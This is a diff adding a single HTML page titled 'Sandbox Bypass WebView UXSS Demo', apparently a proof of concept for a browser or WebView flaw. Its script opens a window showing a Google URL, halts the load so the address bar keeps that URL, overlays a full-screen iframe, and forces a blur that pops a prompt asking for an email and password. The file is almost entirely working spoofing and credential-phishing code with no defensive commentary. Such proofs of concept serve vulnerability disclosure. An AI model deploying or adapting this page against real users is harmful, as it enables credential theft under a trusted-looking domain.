@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sandbox Bypass WebView UXSS Demo</title>
+  <style>
+    iframe {
+      width: 80%;
+      height: 300px;
+      border: 1px solid #ccc;
+      margin-top: 20px;
+    }
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <h1>Click Here</h1>
+  <button onclick="spoof()">Click to spoof</button>
+
+  <script>
+    function spoof() {
+      let win = window.open("https://www.google.com:8080", "_blank");  // Redirect to spoofed URL first
+      setTimeout(() => {
+        try {
+          win.stop();  // Stop load to retain URL
+          let iframe = win.document.createElement('iframe');
+          iframe.id = 'iframe';
+          iframe.style.width = '100%';
+          iframe.style.height = '100%';
+          iframe.style.border = 'none';
+          iframe.style.position = 'fixed';
+          iframe.style.top = '0';
+          iframe.style.left = '0';
+          iframe.style.background = 'white';
+          win.document.body.appendChild(iframe);
+
+          // Add onblur handler with simplified payload trigger
+          win.onblur = function () {
+            win.location.replace("https://www.google.com:8080");  // Lock URL on blur
+            document.getElementById("iframe").src =
+              "javascript:prompt('Demo UXSS Payload:\\n\\nPlease enter your email and password:', 'E-mail / Password');";
+          };
+
+          // Trigger blur manually to show prompt after content loads
+          setTimeout(() => {
+            win.blur();  // Force blur to trigger prompt
+          }, 1000);  // Delay to ensure iframe and URL are ready
+        } catch (e) {
+          console.warn("Blocked:", e);
+        }
+      }, 200);  // Slight delay for URL display
+    }
+  </script>
+</body>
+</html>
